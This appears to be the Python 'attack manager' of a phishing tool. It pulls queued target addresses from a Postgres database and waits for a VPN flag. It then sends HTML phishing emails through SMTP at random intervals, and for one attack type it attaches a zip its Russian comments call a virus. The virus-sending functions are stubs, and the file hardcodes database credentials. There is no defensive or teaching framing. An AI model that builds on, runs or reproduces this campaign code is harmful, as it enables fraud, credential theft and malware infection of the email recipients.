import os
import random
import smtplib
import psycopg2
from time import sleep
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def logging(func_name, msg):
    log_path = '/home/asar/www/asar/logs'
    if not os.path.exists(log_path):
        os.mkdir(log_path)
    log_file = os.path.join(log_path, 'log.txt')
    key = 'w'
    if os.path.isfile(log_file):
        key = 'a'
    message = '[{0}] <{1}> : {2} \n'.format(datetime.now().strftime('%d.%m.%Y %H:%M'), func_name, msg)
    with open(log_file, key) as fl:
        fl.write(message)


def set_config(name, value):
    with psycopg2.connect(dbname='asar_db', user='asar_admin', password='aSaR14!q', host='127.0.0.1', port=5432) \
            as conn:
        with conn.cursor() as cursor:
            cursor.execute('UPDATE manager_configs SET value=%s WHERE name=%s', (value, name,))

    cursor.close()
    conn.close()
    return 'ok'


def get_config(name):
    with psycopg2.connect(dbname='asar_db', user='asar_admin', password='aSaR14!q', host='127.0.0.1', port=5432) \
            as conn:
        with conn.cursor() as cursor:
            cursor.execute('SELECT * FROM manager_configs WHERE name=%s', (name,))
            record = cursor.fetchone()
    cursor.close()
    conn.close()
    return record[2]


def run():
    logging('attack manager', 'START')
    try:
        while True:
            with psycopg2.connect(dbname='asar_db', user='asar_admin', password='aSaR14!q',
                                  host='127.0.0.1', port=5432) as conn:
                with conn.cursor() as cursor:
                    cursor.execute('SELECT * FROM manager_stack WHERE status=%s', ('0',))
                    stack = cursor.fetchall()
                cursor.close()
            conn.close()
            stack_count = len(stack)
            # stack = Stack.objects.all().filter(status='0')

            if stack_count == 0:
                set_config('attacking', '0')
                logging('attack manager', 'FINISH')
                return
            for email in stack:
                while True:
                    if get_config('vpn') == '1':
                        logging('attack manager', 'vpn==1, break')
                        break
                    else:
                        logging('attack manager',
                                'VPN не подключен при атаке почты {0}. Засыпаю в ожиданий'.format(email[3]))
                        sleep(60)
                result = ''
                try:
                    with psycopg2.connect(dbname='asar_db', user='asar_admin', password='aSaR14!q', host='127.0.0.1',
                                          port=5432) \
                            as conn:
                        with conn.cursor() as cursor:
                            cursor.execute('SELECT * FROM grabber_emailconfigs WHERE name=%s',
                                           (email[3].split('@')[1],))
                            eml_prm = cursor.fetchone()
                        cursor.close()
                    conn.close()
                except Exception as e:
                    logging('attack manager', 'Ошибка: {0}'.format(e))
                    continue
                if email[9] == '1':
                    result = send_fishing(eml_prm[2], eml_prm[3], email[1], email[2], email[3], email[5], email[6])
                if email[9] == '2':
                    the_file = os.getcwd() + '/vir_dir/init.zip'
                    # TODO: Генерация вируса и добавление пути
                    result = send_fishing(eml_prm[2], eml_prm[3], email[1], email[2], email[3], email[5], email[6],
                                          the_file)
                if email[9] == '3':
                    send_fishing_with_virus()
                stack_count -= 1
                logging('attack manager', result)
                with psycopg2.connect(dbname='asar_db', user='asar_admin', password='aSaR14!q', host='127.0.0.1',
                                      port=5432) \
                        as conn:
                    with conn.cursor() as cursor:
                        if result[0] == 'У':
                            cursor.execute('UPDATE manager_stack SET status=%s WHERE id=%s', ('1', email[0]))
                        else:
                            cursor.execute('UPDATE manager_stack SET status=%s WHERE id=%s', ('4', email[0]))
                    cursor.close()
                    conn.commit()
                conn.close()
                sleep(random.randint(30, 120))
            del stack
    except Exception as e:
        logging('attack manager', 'Exception. Error: {0}'.format(e))
    finally:
        set_config('attacking', '0')


def send_fishing(host, port, sender, sender_password, email, subject, body, file=None):
    logging('attack manager', 'sending email to {0}'.format(email))
    if file is not None:
        atk_type = 'вируса'
    else:
        atk_type = 'фишинга'
    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'html'))
    except Exception as e:
        return 'err. Ошибка создания MIMEMultipart при отправке {0} msg: {1}'.format(atk_type, str(e))
    if file is not None:
        file_payload = MIMEBase('application', 'octet-stream')
        with open(file, 'rb') as fl:
            file_payload.set_payload(fl.read())
        fl.close()
        encoders.encode_base64(file_payload)
        file_payload.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(file)))
        msg.attach(file_payload)
    try:
        session = smtplib.SMTP(host, port, timeout=120)
    except Exception as e:
        return 'err. Ошибка подключения к хосту {0} по порту {1} при отправке {2}. Ошибка: {3}' \
            .format(host, port, atk_type, str(e))
    try:
        session.starttls()
    except Exception as e:
        return 'err. Ошибка starttls для {0} с паролем {1} при отправке {2}. Ошибка: {3}' \
            .format(sender, sender_password, atk_type, str(e))
    try:
        session.login(sender, sender_password)
    except Exception as e:
        return 'err. Ошибка аутентификации для {0} с паролем {1} при отправке {2}. Ошибка: {3}' \
            .format(sender, sender_password, atk_type, str(e))
    try:
        session.sendmail(sender, email, msg.as_string().encode('utf-8'))
    except Exception as e:
        return 'err. Ошибка при отправке {0} на почту {1}: {2}'.format(atk_type, email, str(e))
    session.quit()
    logging('attack manager', 'finish send email to {0}'.format(email))
    return 'Успешная отправка {0}: {1}'.format(atk_type, email)


def send_fishing_with_virus():
    pass


def send_vir():
    pass


if get_config('attacking') == '0':
    set_config('attacking', '1')
    run()
